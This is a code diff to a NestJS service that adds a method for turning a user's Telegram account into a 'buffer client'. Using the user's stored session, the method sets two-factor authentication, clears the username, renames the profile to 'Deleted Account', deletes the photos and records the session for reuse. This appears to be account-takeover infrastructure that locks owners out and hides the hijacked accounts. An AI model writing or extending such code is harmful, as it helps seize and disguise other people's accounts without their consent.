@@ -1,4 +1,4 @@
-import { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';
+import { BadRequestException, HttpException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';
 import { InjectModel } from '@nestjs/mongoose';
 import { Model } from 'mongoose';
 import { CreateBufferClientDto } from './dto/create-buffer-client.dto';
@@ -7,6 +7,8 @@ import { TelegramService } from '../Telegram/Telegram.service';
 import { sleep } from 'telegram/Helpers';
 import { UsersService } from '../users/users.service';
 import { ActiveChannelsService } from '../activechannels/activechannels.service';
+import { parseError } from '../../../utils';
+import { ClientService } from '../clients/client.service';
 
 @Injectable()
 export class BufferClientService {
@@ -17,6 +19,8 @@ export class BufferClientService {
         private usersService: UsersService,
         @Inject(forwardRef(() => ActiveChannelsService))
         private activeChannelsService: ActiveChannelsService,
+        @Inject(forwardRef(() => ClientService))
+        private clientService: ClientService,
     ) { }
 
     async create(bufferClient: CreateBufferClientDto): Promise<BufferClient> {
@@ -106,6 +110,49 @@ export class BufferClientService {
             } catch (error) {
                 console.log(error)
             }
+        }
+    }
+    async setAsBufferClient(
+        mobile: string,
+        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]
+    ) {
+        const user = (await this.usersService.search({ mobile }))[0];
+        if (!user) {
+            throw new BadRequestException('user not found');
+        }
+        const clients = await this.clientService.findAll();
+        const clientIds = clients.map(client => client.mobile);
+        if (!clientIds.includes(mobile)) {
+            const telegramClient = await this.telegramService.createClient(mobile)
+            try {
+                await telegramClient.set2fa();
+                await sleep(15000)
+                await telegramClient.updateUsername('');
+                await sleep(3000)
+                await telegramClient.updatePrivacyforDeletedAccount();
+                await sleep(3000)
+                await telegramClient.updateProfile("Deleted Account", "Deleted Account");
+                await sleep(3000)
+                await telegramClient.deleteProfilePhotos();
+                const channels = await this.telegramService.getChannelInfo(mobile, true)
+                await this.telegramService.deleteClient(mobile)
+                const bufferClient = {
+                    tgId: user.tgId,
+                    session: user.session,
+                    mobile: user.mobile,
+                    createdDate: (new Date(Date.now())).toISOString().split('T')[0],
+                    availableDate,
+                    channels: channels.ids.length,
+                    updatedDate: (new Date(Date.now())).toISOString().split('T')[0]
+                }
+                await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();
+                return "Client set as buffer successfully";
+            } catch (error) {
+                const errorDetails = parseError(error)
+                throw new HttpException(errorDetails.message, parseInt(errorDetails.status))
+            }
+        } else {
+            throw new BadRequestException("Number is a Active Client")
         }
     }
 
